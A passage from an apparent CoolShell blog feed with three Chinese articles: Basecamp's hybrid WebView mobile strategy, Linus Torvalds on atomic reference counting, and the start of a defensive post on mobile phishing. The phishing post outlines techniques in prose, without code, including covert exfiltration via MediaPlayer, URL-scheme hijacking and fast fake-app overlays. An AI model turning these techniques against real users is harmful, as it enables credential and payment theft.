<p>当然这个结论在某些领域并不太适用。如果你要开发一个 3D 游戏，原生开发方式能够带来更好的游戏体验。但如果你的移动应用象 Basecamp 一样侧重信息处理，为了降低开发成本，你就可以考虑混合开发方式。我们就是如此，下面是我们三代移动产品的发展轨迹：</p>
<p><span id="more-12225"></span></p>
<h4>
<span class="ez-toc-section" id="%E7%AC%AC%E4%B8%80%E4%BB%A3%E4%BA%A7%E5%93%81%EF%BC%9A%E5%8E%9F%E7%94%9F%E5%A4%96%E5%A3%B3native_shell%EF%BC%8B%E5%B5%8C%E5%A5%97WebView"></span>第一代产品：原生外壳(native shell)＋嵌套WebView<span class="ez-toc-section-end"></span>
</h4>
<p><img alt="image placeholder" ></p>
<p>这个版本就是一个简单的原生外壳负责界面导航，嵌套一个 WebView 来显示 Basecamp Rail application，显示的基本上都是我们移动网站页面，再加上一些特殊的样式。</p>
<p>在移动网站的页面上嵌套一个原生的壳，听起来还是 Web 页面，但实际带给用户的体验确是非常不同。用户可以在 Apple App Store 找到我们的 app，他们一旦登录 app 后可以再也不用重新登录（移动版本的 Safari 似乎会经常清空 cookie，让你不得不重新登录）。我们的 app 大受欢迎，用户评分在4和5之间。</p>
<p>整个 app 由一名程序员和一名设计师开发，成本不高，因为我们可以在已有的移动网站的基础上开发。</p>
<p>如果我们当初开发完全原生的 app，用10个人的团队1年半的时间也未必能完成。</p>
<p> </p>
<h4>
<span class="ez-toc-section" id="%E7%AC%AC%E4%BA%8C%E4%BB%A3%E4%BA%A7%E5%93%81%EF%BC%9A%E5%8E%9F%E7%94%9F%E5%A4%96%E5%A3%B3%EF%BC%8B%E5%8E%9F%E7%94%9F%E5%AF%BC%E8%88%AA%E7%95%8C%E9%9D%A2"></span>第二代产品：原生外壳＋原生导航界面<span class="ez-toc-section-end"></span>
</h4>
<p><img alt="image placeholder" ></p>
<p>几个月前发布的 Basecamp Android app 是我们的第二代产品，我们在其中做了大量的改进。</p>
<p>从第一代 iPhone app 中我们感受到了原生导航界面的威力，所以在 Android 版本中，我们由 HTML 页面导航转向了原生导航界面。我们从 HTML 页面生成原生导航界面，用户体验更加流畅，原生界面和 HTML 页面的体验差别越来越小，甚至很难区分哪些是原生部分，哪些是 HTML 。</p>
<p>Android 版本是由一两个程序员和一个设计师开发（50%投入）完成的。我们重用了移动站点和 iPhone app 中使用的所有 webview，大大提高了开发效率，同时用户也很买账，超过1000名用户打了4.5~5的高分。</p>
<p>很多公司在抱怨他们的 iOS 移动项目进展缓慢，Android 项目似乎更是如此。或许他们已经习惯了 iOS 项目的开发流程，也许是因为 Android 的屏幕碎片化问题，但是这些对我们来说那都不是事。我们推出的 Android app 表现良好，重用了95%的代码，开发团队也一直保持在小规模。</p>
<p> </p>
<h4>
<span class="ez-toc-section" id="%E5%9B%A0%E5%9C%B0%E5%88%B6%E5%AE%9C%E5%9C%B0%E8%BF%90%E7%94%A8%E5%8E%9F%E7%94%9F%E5%BC%80%E5%8F%91%E6%96%B9%E5%BC%8F"></span>因地制宜地运用原生开发方式<span class="ez-toc-section-end"></span>
</h4>
<p>目前我们正在开发第三代产品，发布的平台暂时保密，不过你应该也不难猜到。在前两代产品中，我们增加了原生导航界面的使用，同时进一步确定了以 webview 为核心的整体架构。在第三代产品中，我们将因地制宜地选择需要使用原生开发的功能，好钢要用在刀刃上。</p>
<p>从之前的100% HTML，到现在的90% HTML +10%原生，我们会选择最值得做原生开发的那10%的部分，最终目的是让 app 原生部分和 HTML 部分的体验没有太大区别。</p>
<p> </p>
<h4>
<span class="ez-toc-section" id="%E6%B7%B7%E5%90%88%E5%BC%80%E5%8F%91%E6%A8%A1%E5%BC%8F%E4%BD%BF%E7%94%A8%E7%9A%84%E6%8A%80%E6%9C%AF"></span>混合开发模式使用的技术<span class="ez-toc-section-end"></span>
</h4>
<p>混合开发模式在技术很简单，主要是处理 webview 的集成、Web 页面的加载，以及原生内容和 HTML 内容之间的交叉链接，其实可能比你想像的还要简单得多。</p>
<p>HTML 方面，我们的 Rails Web 应用支持 Web 和移动两大平台，其中 <a href="http://edgeguides.rubyonrails.org/4_1_release_notes.html#action-pack-variants" target="_blank">Rails 4.1 feature of variants</a> 起了很大的作用。</p>
<p>这也很大程度上有助于我们发布新功能。设想一下如果我们每次需要更新这么多平台：Rails desktop app, a Rails API app, a client-side MVC app, a mobile web wrapper app, an Android app, and an iPhone app，像我们这样只有10个程序员和7个设计师的公司根本无力承担如此巨大的工作量。</p>
<p>除了工作量的减轻，bug 修复效率也提高了，因为大部分的代码逻辑是在 Web 服务器端，我们可以随时修改代码并发布，不用通过 Apple App Store 的审批流程。所以我们的移动 app 和 Web 应用一样，也是持续部署。</p>
<p>就如我之前提到的，混合模式开发并不适用于所有情况。在2010年以前，那时手机的处理能力都不强，所以 HTML/JS 的体验并不好，用户也不喜欢。但是时过境迁，现在手机的处理能力大大提高了，HTML/JS 的性能也不再是一个问题。</p>
<p> </p>
<h4>
<span class="ez-toc-section" id="%E6%B7%B7%E5%90%88%E5%BC%80%E5%8F%91%E6%A8%A1%E5%BC%8F%E5%AF%B9%E5%8E%9F%E7%94%9F%E5%BC%80%E5%8F%91%E6%A8%A1%E5%BC%8F%E7%9A%84%E6%8C%91%E6%88%98"></span>混合开发模式对原生开发模式的挑战<span class="ez-toc-section-end"></span>
</h4>
<p>混合开发模式在降低开发复杂度方面有它的优势，如果你的产品是以显示和处理信息为主，我认为都可以不同程度地采用这个模式。</p>
<p>对于小型团队和公司而言，并不一定需要采用 iOS 原生 app 先行的模式。使用混合模式，不需要你重头开发一个 app，这样可以降低维护成本，将来扩展到其他平台也更为方便。</p>
<p>当然我知道会有很多人质疑这个模式，或许因为他们的 app 中有很多地方需要原生开发（也许仅仅是他们自己这样认为罢了）。又或许他们已经花了很多时间让 app 里的 UITableView 看起来非常漂亮，以致如果其他地方不这样的话显得不是太完美。再或许大公司就是喜欢耗时耗力的原生开发，有钱就是这么任性。</p>
<p>无论怎样，混合开发当下应该能够成为我们移动开发策略的一个选择。如果你认为这是一个好的选择，那么恭喜你，尽情愉快地玩耍吧！</p>
<p> </p>
<p><em>原文链接：<a href="https://signalvnoise.com/posts/3743?utm_campaign=iOS_Dev_Weekly_Issue_175&amp;utm_medium=email&amp;utm_source=iOS%2BDev%2BWeekly" target="_blank">Hybrid sweet spot: Native navigation, web content</a></em></p>
<p> </p>
<p>下面补充一些 David 答读者问：</p>
<p> </p>
<p>Mike Waite @ 2014-05-08：我很好奇你是如何决定哪些功能要用原生开发？<br>
David @ 2014-05-08：主要靠感觉，这毕竟不是一门科学。如果你感觉你app的某一部分如果用原生开发会更好些，可以尝试做快速原型（spike）。很多时候我们通过这种方式证明我们的想法其实是错的。当然如果你需要使用到手机上的功能如：摄像和其他设备时，HTML目前还不太适用，不过永远也不要把话说死。</p>
<p> </p>
<p>Mike Parsons @ 2014-05-08：好文。很好奇你们是否使用 PhoneGap 或者 Cordova 这样的框架，或者你们自己开发了一个？<br>
David @ 2014-05-08：我们没有使用任何框架。（此处省去xxx字）</p>
<p> </p>
<p>Derick @ 2014-05-08：你怎样解决 Android 浏览器渲染速度慢的问题？这也是 Android 平台上更多人倾向开发原生app得原因。<br>
David @ 2014-05-08：不知道你这个结论是近期的还是以前的？Basecamp 的 Android app 在我的 Nexus 5 和 HTC One 上面运行得非常流畅。<br>
Derick @ 2014-05-08：就是最近。我猜测可能和你使用JavaScript的多少有关系。因为以我个人的经验，Android 上 JavaScript 的运行速度非常慢。如果你感兴趣可以看看下面的文章：<a href="https://www.timroes.de/2013/11/23/old-webview-vs-chromium-webview/" target="_blank">https://www.timroes.de/2013/11/23/old-webview-vs-chromium-webview/</a><br>
David @ 2014-05-08：我们使用了很多JavaScript，当然没有 Web MVC 客户端用得那样多。另外我们使用了 Turbolinks ：）</p>
<p> </p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2014-12-15T10:57:20+08:00</pubDate>
<guid>https://coolshell.cn/articles/12225.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Linus：为何对象引用计数必须是原子的 ]]></title>
<link>https://coolshell.cn/articles/16910.html</link>
<content><![CDATA[ 
<p><strong>（感谢网友 </strong><a href="https://weibo.com/fullofbull" target="_blank"><strong>@我的上铺叫路遥</strong></a><strong> 投稿）</strong></p>
<p>Linus大神又在rant了！这次的吐槽对象是时下很火热的<strong>并行技术(parellism)</strong>，并直截了当地表示<a title="并行计算基本上就是浪费大家的时间" href="http://www.vaikan.com/linus-parallel-computing-is-a-huge-waste-of-everybodys-time/" target="_blank">并行计算是浪费所有人时间</a>(<a href="http://www.realworldtech.com/forum/?threadid=146066&amp;curpostid=146227">“The whole “let’s parallelize” thing is a huge waste of everybody’s time.”</a>)。大致意思是说<strong>乱序性能快、提高缓存容量、降功耗</strong>。当然笔者不打算正面讨论并行的是是非非（过于宏伟的主题），因为Linus在另一则<a title="reference counting" href="http://www.realworldtech.com/forum/?threadid=146066&amp;curpostid=146183" target="_blank">帖子</a>中举了对象<strong>引用计数(reference counting)</strong>的例子来说明并行的复杂性。</p>
<p>在Linus回复之前有人指出<strong>对象需要锁机制的情况下，引用计数的原子性问题：</strong></p>
<blockquote>
<p>Since it is being accessed in a multi-threaded way, via multiple access paths, generally it needs its own mutex — otherwise, reference counting would not be required to be atomic and a lock of a higher-level object would suffice.</p>
<p>由于（对象）通过多线程方式及多种获取渠道，一般而言它需要自身维护一个互斥锁——否则引用计数就不要求是原子的，一个更高层次的对象锁足矣。</p>
</blockquote>
<p>而Linus不那么认为：</p>
<blockquote>
<p>The problem with reference counts is that you often need to take them *before* you take the lock that protects the object data.</p>
<p>引用计数的问题在于你经常需要在对象数据<strong>上锁保护之前</strong>完成它。</p>
</blockquote>
<p>The thing is, you have two different cases:</p>
<p>问题有两种情况：</p>
<p style="padding-left: 30px;"><strong>– object *reference* 对象引用</strong></p>
<p style="padding-left: 30px;"><strong>– object data 对象数据</strong></p>
<p>and they have completely different locking.</p>
<p><strong>它们锁机制是完全不一样的。</strong></p>
<p><span id="more-16910"></span></p>
<p>Object data locking is generally per-object. Well, unless you don’t have huge scalability issues, in which case you may have some external bigger lock (extreme case: one single global lock).</p>
<p>对象数据保护一般是一个对象拥有一个锁，假设你没有海量扩展性问题，不然你需要一些外部大一点的锁（极端的例子，一个对象一个全局锁）。</p>
<p>But object *referencing* is mostly about finding the object (and removing/freeing it). Is it on a hash chain? Is it in a tree? Linked list? When the reference count goes down to zero, it’s not the object data that you need to protect (the object is not used by anything else, so there’s nothing to protect!), it’s the ways to find the object you need to protect.</p>
<p>但对象引用主要关于对象的寻找（移除或释放），它是否在哈希链，一棵树或者链表上。<strong>当对象引用计数降为零，你要保护的不是对象数据，因为对象没有在其它地方使用，你要保护的是对象的寻找操作。</strong></p>
<p>And the lock for the lookup operation cannot be in the object, because – by definition – you don’t know what the object is! You’re trying to look it up, after all.</p>
<p>而且查询操作的锁不可能在对象内部，因为根据定义，你还不知道这是什么对象，你在尝试寻找它。</p>
<p>So generally you have a lock that protects the lookup operation some way, and the reference count needs to be atomic with respect to that lock.</p>
<p>因此一般你要对查询操作上锁，而且引用计数相对<strong>那个锁</strong>来说是原子的（译者注：查询锁不是引用计数所在的对象所有，不能保护对象引用计数，后面会解释为何引用计数变更时其所在对象不能上锁）。</p>
<p>And yes, that lock may well be sufficient, and now you’re back to non-atomic reference counts. But you usually don’t have just one way to look things up: you might have pointers from other objects (and that pointer is protected by the object locking of the other object), but there may be multiple such objects that point to this (which is why you have a reference count in the first place!)</p>
<p>当然这个锁是充分有效的，现在假设引用计数是非原子的，但你常常不仅仅使用一种方式来查询：你可能拥有其它对象的指针（这个指针又被其它对象的对象锁给保护起来），但同时还会有多个对象指向它（这就是为何你第一时间需要引用计数的理由）。</p>
<p>See what happens? There is no longer one single lock for lookup. Imagine walking a graph of objects, where objects have pointers to each other. Each pointer implies a reference to an object, but as you walk the graph, you have to release the lock from the source object, so you have to take a new reference to the object you are now entering.</p>
<p>看看会发生什么？查询不止存在一个锁保护。你可以想象走过一张对象流程图，其中对象存在指向其它对象的指针，每个指针暗含了一次对象引用，但当你走过这个流程图，你必须释放源对象的锁，而你进入新对象时又必须增加一次引用。</p>
<p>And in order to avoid deadlocks, you can not in the general case take the lock of the new object first – you have to release the lock on the source object, because otherwise (in a complex graph), how do you avoid simple ABBA deadlock?</p>
<p>而且为了避免死锁，你一般不能立即对新对象上锁——你必须释放源对象的锁，否则在一个复杂流程图里，你如何避免<strong>ABBA死锁</strong>（译者注：假设两个线程，一个是A-&gt;B，另一个B-&gt;;A，当线程一给A上锁，线程二给B上锁，此时两者谁也无法释放对方的锁）？</p>
<p>So atomic reference counts fix that. They work because when you move from object A to object B, you can do this:</p>
<p>原子引用计数修正了这一点，当你从对象A到对象B，你会这样做：</p>
<p>(a) you have a reference count to A, and you can lock A</p>
<p style="padding-left: 30px;">对象A增加一次引用计数，并上锁。</p>
<p>(b) once object A is locked, the pointer from A to B is stable, and you know you have a reference to B (because of that pointer from A to B)</p>
<p style="padding-left: 30px;">对象A一旦上锁，A指向B的指针就是稳定的，于是你知道你引用了对象B。</p>
<p>(c) but you cannot take the object lock for B (ABBA deadlock) while holding the lock on A</p>
<p style="padding-left: 30px;">但你不能在对象A上锁期间给B上锁（ABBA死锁）。</p>
<p>(d) increment the atomic reference count on B</p>
<p style="padding-left: 30px;">对象B增加一次原子引用计数。</p>
<p>(e) now you can drop the lock on A (you’re “exiting” A)</p>
<p style="padding-left: 30px;">现在你可以扔掉对象A的锁（退出对象A）。</p>
<p>(f) your reference count means that B cannot go away from under you despite unlocking A, so now you can lock B.</p>
<p style="padding-left: 30px;">对象B的原子引用计数意味着即使给A解锁期间，B也不会失联，现在你可以给B上锁。</p>
<p>See? Atomic reference counts make this kind of situation possible. Yes, you want to avoid the overhead if at all possible (for example, maybe you have a strict ordering of objects, so you know you can walk from A to B, and never walk from B to A, so there is no ABBA deadlock, and you can just lock B while still holding the lock on A).</p>
<p>看见了吗？原子引用计数使这种情况成为可能。是的，你想尽一切办法避免这种代价，比如，你也许把对象写成严格顺序的，这样你可以从A到B，绝不会从B到A，如此就不存在ABBA死锁了，你也就可以在A上锁期间给B上锁了。</p>
<p>But if you don’t have some kind of forced ordering, and if you have multiple ways to reach an object (and again – why have reference counts in the first place if that isn’t true!) then atomic reference counts really are the simple and sane answer.</p>
<p>但如果你无法做到这种强迫序列，如果你有多种方式接触一个对象（再一次强调，这是第一时间使用引用计数的理由），这样，原子引用计数就是简单又理智的答案。</p>
<p>If you think atomic refcounts are unnecessary, that’s a big flag that you don’t actually understand the complexities of locking.</p>
<p><strong>如果你认为原子引用计数是不必要的，这就大大说明你实际上不了解锁机制的复杂性。</strong></p>
<p>Trust me, concurrency is hard. There’s a reason all the examples of “look how easy it is to parallelize things” tend to use simple arrays and don’t ever have allocations or freeing of the objects.</p>
<p>相信我，<strong>并发设计是困难的。</strong>所有关于“并行化如此容易”的理由都倾向于使用简单数组操作做例子，甚至不包含对象的分配和释放。</p>
<p>People who think that the future is highly parallel are invariably completely unaware of just how hard concurrency really is. They’ve seen Linpack, they’ve seen all those wonderful examples of sorting an array in parallel, they’ve seen all these things that have absolutely no actual real complexity – and often very limited real usefulness.</p>
<p>那些认为未来是高度并行化的人一成不变地完全没有意识到并发设计是多么困难。他们只见过<a title="Linpack" href="https://en.wikipedia.org/wiki/LINPACK" target="_blank">Linpack</a>，他们只见过并行技术中关于数组排序的一切精妙例子，他们只见过一切绝不算真正复杂的事物——对真正的用处经常是非常有限的。</p>
<p>（译者注：当然，我无意借大神之口把技术宗教化。实际上Linus又在另一篇<a title="评价" href="http://www.realworldtech.com/forum/?threadid=146066&amp;curpostid=146198" target="_blank">帖子</a>中综合了对并行的评价。）</p>
<p>Oh, I agree. My example was the simple case. The really complex cases are much worse.</p>
<p>哦，我同意。我的例子还算简单，真正复杂的用例更糟糕。</p>
<p>I seriously don’t believe that the future is parallel. People who think you can solve it with compilers or programming languages (or better programmers) are so far out to lunch that it’s not even funny.</p>
<p>我严重不相信未来是并行的。有人认为你可以通过编译器，编程语言或者更好的程序员来解决问题，他们目前都是神志不清，没意识到这一点都不有趣。</p>
<p>Parallelism works well in simplified cases with fairly clear interfaces and models. You find parallelism in servers with independent queries, in HPC, in kernels, in databases. And even there, people work really hard to make it work at all, and tend to expressly limit their models to be more amenable to it (eg databases do some things much better than others, so DB admins make sure that they lay out their data in order to cater to the limitations).</p>
<p>并行计算可以在简化的用例以及具备清晰的接口和模型上正常工作。你发现并行在服务器上独立查询里，在高性能计算(High-performance computing)里，在内核里，在数据库里。即使如此，人们还得花很大力气才能使它工作，并且还要明确限制他们的模型来尽更多义务（例如数据库要想做得更好，数据库管理员得确保数据得到合理安排来迎合局限性）。</p>
<p>Of course, other programming models can work. Neural networks are inherently very parallel indeed. And you don’t need smarter programmers to program them either..</p>
<p>当然，其它编程模型倒能派上用场，神经网络(neural networking)天生就是非常并行化的，你不需要更聪明的程序员为之写代码。</p>
<h4>参考资料</h4>
<ul>
<li>
<a title="Real World Technologies" href="http://www.realworldtech.com/" target="_blank">Real World Technologies</a>：Linus常去“灌水”的一个论坛，讨论未来机器架构（看名字就知道Linus技术偏好，及其之前对虚拟化技术(virtualization)的<a title="virtualization is evil" href="http://www.networkworld.com/article/2220440/opensource-subnet/torvalds-says---virtualization-is-evil-.html" target="_blank">吐槽</a>）</li>
<li>
<a title="多线程程序中操作的原子性" href="http://www.parallellabs.com/2010/04/15/atomic-operation-in-multithreaded-application/" target="_blank">多线程程序中操作的原子性</a>：解释为什么i++不是原子操作</li>
<li>
<a title="Concurrency Is Not Parallelism" href="http://www.vaikan.com/docs/Concurrency-is-not-Parallelism" target="_blank"> Concurrency Is Not Parallelism</a>：Go语言之父Rob Pike幻灯片解释“并发”与“并行”概念上的区别</li>
</ul>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2014-12-31T09:59:33+08:00</pubDate>
<guid>https://coolshell.cn/articles/16910.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 关于移动端的钓鱼式攻击 ]]></title>
<link>https://coolshell.cn/articles/17066.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >今天，在微博上看了一篇《<a href="https://weibo.com/p/1001603830475402664763" target="_blank">微信和淘宝到底是谁封谁</a>》的文章，我觉得文章中逻辑错乱，所以，我发了一篇<a href="https://weibo.com/p/1001603831131286939079" target="_blank">关于这篇文章逻辑问题的长微博</a>。后面，我被原博主冷嘲热讽了一番，说是什么鸡汤啊，什么我与某某之流的人在一起混淆视听啊，等等。并且也有一些网友找我讨论一下相关的钓鱼式攻击的技术问题。所以，我想写下这篇纯技术文章，因为我对那些商业利益上的东西不关心，所以，只谈技术，这样最简单。</p>
<p>首先说明一下，<strong>我个人不是一个安全专家，也不是一个移动开发专家，按道理来说，这篇文章不应该我来写，但是我就试一试，请原谅我的无知，也期待抛砖引玉了，希望安全的同学斧正</strong>。</p>
<p>关于钓鱼式攻击，其实是通过一种社会工程学的方式来愚弄用户的攻击式，攻击者通常会模仿一个用户信任的网站来偷取用户的机密信息，比如用户密码或是信用卡。一般来说，攻击者会通过邮件和实时通信工具完成，给被攻击者发送一个高仿的网站，然后让用户看不出来与正统网站的差别，然后收集用户的机密数据。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E7%A7%BB%E5%8A%A8%E7%AB%AF%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%E7%82%B9%E5%88%86%E6%9E%90" title="移动端钓鱼攻击点分析">移动端钓鱼攻击点分析</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-2" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F" title="攻击方式">攻击方式</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-3" href="#%E4%BB%8E%E4%B8%80%E4%B8%AA%E5%BA%94%E7%94%A8%E5%94%A4%E8%B5%B7%E5%8F%A6%E4%B8%80%E4%B8%AA%E5%BA%94%E7%94%A8%E7%9A%84%E6%96%B9%E5%BC%8F" title="从一个应用唤起另一个应用的方式">从一个应用唤起另一个应用的方式</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-4" href="#%E5%9C%A8%E4%B8%80%E4%B8%AA%E5%BA%94%E7%94%A8%E5%86%85%E5%86%85%E5%B5%8CWeb%E7%9A%84%E6%96%B9%E5%BC%8F" title="在一个应用内内嵌Web的方式">在一个应用内内嵌Web的方式</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E6%80%8E%E4%B9%88%E9%98%B2%E8%8C%83%E9%92%93%E9%B1%BC%E5%BC%8F%E6%94%BB%E5%87%BB" title="怎么防范钓鱼式攻击">怎么防范钓鱼式攻击</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E5%85%B3%E4%BA%8E%E5%BE%AE%E4%BF%A1%E5%92%8C%E6%B7%98%E5%AE%9D" title="关于微信和淘宝">关于微信和淘宝</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E7%A7%BB%E5%8A%A8%E7%AB%AF%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%E7%82%B9%E5%88%86%E6%9E%90"></span>移动端钓鱼攻击点分析<span class="ez-toc-section-end"></span>
</h4>
<p>因为钓鱼式攻击并不新鲜，所以我这里只讲移动方面的。</p>
<p>在移动端，这个事情会更容易干，因为移动端有如下特点：</p>
<ul>
<li>移动端的UI只能有一个应用占据整个屏幕，你只能看到一个应用，而且用户屏幕小，能显示的信息有限，比如浏览器里的网址是显示不全的。这会给钓鱼攻击有很多可乘之机。</li>
</ul>
<ul>
<li>移动端的平台有其安全的设计。每个应用都是隔离开的，一个应用无法获取另一个应用的数据。而且应用的下载基本上来说都是来自合法的地方。比如iOS的设备通过App Store下载，每个程序都有自己的签名保证不会被篡改。而且移动端的的应用有各种权限配置，这样也能很大程度提高安全性。</li>
</ul>
<ul>
<li>移动端的APP有些有些是收费的，所以自然会有盗版需求，虽然在平台上做了一些安全设计，但是并不完美。用户可以越狱，可以root。这给恶意软件有了可乘之机。</li>
</ul>
<p>下面我们来分析下移动端的用户操作，我们重点关注用户控制权的切换过程（因为这是攻击点）</p>
<p><span id="more-17066"></span></p>
<p>在移动设备上，基本上来说，用户的控制切换有四种：</p>
<ul>
<li>从一个APP切到另一个APP，也就是我们所谓的唤出APP。</li>
<li>从一个APP唤出一个Web，常见为一个嵌入式的WebView或是一个浏览器</li>
<li>从一个Web唤出一个APP，这需要浏览器支持一些非标准的HTTP协议，比如skype://之类的。</li>
<li>从一个Web到另一个Web，这和Web上的方式差不多。</li>
</ul>
<p>基本上来说，<strong>黑客的攻击从来都是找这样的转换环节来做文章的，并且需要一个用户非常熟悉的场景（这样用户才会放松警惕）</strong>。</p>
<p>通过观察移动APP的特性，我们可以知道，当用户控制切换时，有下面的这些特性：</p>
<ul>
<li>到另一个APP时，需要用户登录（如果登录的session过期了）</li>
<li>当支付的时候，需要用户输入支付信息（信用卡信息、支持密码）</li>
</ul>
<p>那么用户在移动APP上经常做的事是什么？</p>
<ul>
<li>
<strong>社交分享</strong>：分享到微博，分享到微信等等，分享的时候，可能需要你输入用户名和口令。</li>
</ul>
<ul>
<li>
<strong>应用内购</strong>：一般来说APP会有两种，一种免费的，一种是收费的，大量的用户都是下载免费的，然后通过什么“开通更多关卡”、“去广告”、“买道具”之类的东西，让用户输入支付信息。Apple的支付的时候也会要用户输入Apple ID的密码。</li>
</ul>
<ul>
<li>
<strong>点击链接</strong>：有时候，我们收到短信，或是二维码，或是一个微信微博，会让我们去点击一个网站链接，这个网站链接要么就是打开一个网页，要么就是启动应用，要么就是跳转到应用市场去下载应用（如果你没安装）。</li>
</ul>
<p>所以，一个好的钓鱼式攻击一定会从这些地方入手，然后高仿UI以及交互流程，这个交互流程和用户日常操作的完全一样，让用户无法察觉。任何方式的钓鱼攻击简单来说，会有两种：</p>
<ul>
<li>
<strong>一种是直接攻击：</strong>你下载了一个恶意的APP，或是打开了一个恶意的冒牌APP。</li>
<li>
<strong>一种是中间人攻击：</strong>用户控制权转换时的两端都是正规应用，但是中间的过程不是正常的。</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"></span>攻击方式<span class="ez-toc-section-end"></span>
</h4>
<p>下面是一些常见的攻击方式：</p>
<h5>
<span class="ez-toc-section" id="%E4%BB%8E%E4%B8%80%E4%B8%AA%E5%BA%94%E7%94%A8%E5%94%A4%E8%B5%B7%E5%8F%A6%E4%B8%80%E4%B8%AA%E5%BA%94%E7%94%A8%E7%9A%84%E6%96%B9%E5%BC%8F"></span>从一个应用唤起另一个应用的方式<span class="ez-toc-section-end"></span>
</h5>
<p><strong>直接攻击</strong></p>
<p>当你点击一个社交分享按钮，或是一个支付按钮的时候。就会转到一个页面，这个页面需要你输入用户机密信息（密码或是支付信息），然后再唤起真正的APP。</p>
<p>一个有恶意的APP可能会让你放松警惕，因为，这个你在安装这个APP的时候，你会发现这个APP根本不需要任何的权限（Android上的），甚至连网络访问的权限都不要，因为在Android下，App可以通过别的组件访问互联网，比如：恶意应用可能创建一个MediaPlayer Object，然后就可以通过这个对象访问一个URL然后把偷到的信息发送出去。</p>
<p>你的手机要被安装一个恶意的应用并不难，同样通过社工的方式，比如：盗版，色情，伪装成客服等等通过人性的弱点让你去一些非受信的市场上安装。iOS设备上的应用也可以不用通过App Store安装（通过itms-services协议，可以通过safari浏览器直接在IOS设备上安装应用程序）。</p>
<p>还有，人们都是贪小便宜的人，所以，会到某些地方买一些便宜的手机（比如淘宝），现在的高仿手机，翻新的二手手机对于一般人甚至安全专家来说完全没有识别能力。这些手机中有很大可能藏有恶意程序。你千万不要以为你格式化手机就OK了。今天（2015年4月14日）早上CCTV2台的“第一时间”就说了一个案例，你可以看看。另外，你可以看看相关的新闻。（另外，你把你的旧手机卖了也要小心，因为你的数据就在里面，旧手机已经成了一个灰色产业链）</p>
<p>另外，Apple的App需要有一个review过程，这个过程对大众是神秘的，但我觉得应该会包括安全方面的review。不过，这个审核过程可能也有空子可以钻。比如：在review的时候，这个应用完全正常，但在用户使用的时候，会自己从网站下载一些自己的配置文件而改变行为（更为直接的就是访问外部网页时在审核时和在用户应用时可能完全不一样，Apple应该完全没有能力审核应用要访问的外部站点）</p>
<p><strong>中间人攻击</strong></p>
<p>我们知道，一个APP唤起另一个APP好多都是用url-scheme的，也就是某种协议，审核这样的协议非常简单，所以如果有恶意的东西在里面基本上很容易看到。但是，如果某些APP并没有注册自己的url-scheme，或是没有被安装，反而，另一个有恶意的APP注册了这个scheme，那么，就会导致恶意的APP被唤起来了（<span style="color: #ff0000;"><strong>这就是我为什么在我的微博中说，如果用户没有安装淘宝的客户端，那么，让微信唤起淘宝的客户端时，有可能是另一个有恶意的APP。但是很多人不懂这个事。<span style="color: #000000;">在iOS下，两个APP通讯正确的做法是“钥匙串机制”</span></strong></span>）。</p>
<p>当然如果有两个应用被注册了同一个scheme，那么，iOS和Android会给出一个选择，让用户来选（注：iOS的系统有可能会直接跳某个 App 上去，不同版本的跳规则不明确，可以认为是随机跳转）。于是乎，恶意的APP就要努力的让自己比正规的APP看起来更像个正规的APP就可以了。</p>
<p>在Android平台上，这个事可能更变态，只要恶意的应用有两个权限，一个是随手机操作系统在后台启动，一个是task list（然而这两个权限都是一般权限）。这样一来，当你进行两个APP切换时，恶意程序可以通过task list权限监控到，然后自己马上先于正规的app出现，等到收集完用户数据后简单的退出就好了。这个方式只需要你的程序能在10ms以内反应过来（最佳是5ms左右），人的肉眼根本看不出来。（在iOS设备下，除了jail break后的iPhone可以这么干，正常的都iPhone还没有找到这样的攻击方式）</p>
<h5>
<span class="ez-toc-section" id="%E5%9C%A8%E4%B8%80%E4%B8%AA%E5%BA%94%E7%94%A8%E5%86%85%E5%86%85%E5%B5%8CWeb%E7%9A%84%E6%96%B9%E5%BC%8F"></span>在一个应用内内嵌Web的方式<span class="ez-toc-section-end"></span>
</h5>
<p>这种方式更容易攻击了，现在很多很多应用都是内嵌的Web的形式，你完全不知道打开的网页的网站是什么，因为这些内嵌的WebView你连地址都看不见。而且无论是iOS或Android，其WebView都可以执行任何的Javascript代码，就算显示URL，URL也可能是被混乱过的，你也看不全，你也很容易上当。当然，那些使用带SSL证书的支持HTTPS的网站（尤其是EV证书）可以在地址栏上显示一个绿色的标记表示你访问的就是正确网址，但是并不是所有的浏览器都会这样，比如iPhone的Safari并没有这个提示，所以，你一定要用Chrome。</p>
